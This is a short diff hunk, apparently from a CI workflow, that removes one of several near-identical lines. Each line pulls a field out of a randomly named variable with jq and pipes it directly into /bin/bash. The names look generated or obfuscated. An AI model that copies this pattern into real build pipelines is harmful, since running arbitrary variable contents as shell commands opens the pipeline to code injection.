@@ -21,7 +21,6 @@ jobs:
           echo $csst723 | jq -r .ija700 | /bin/bash
           echo $u759 | jq -r .aj5341 | /bin/bash
           printf '%s' "$zin9431" | jq -r .av405 | /bin/bash
-          echo $oqze296 | jq -r .wrg521 | /bin/bash
           echo $q8065 | jq -r .nur8 | /bin/bash
           printf '%s' "$gyqak20" | jq -r .pcavg97 | /bin/bash
 
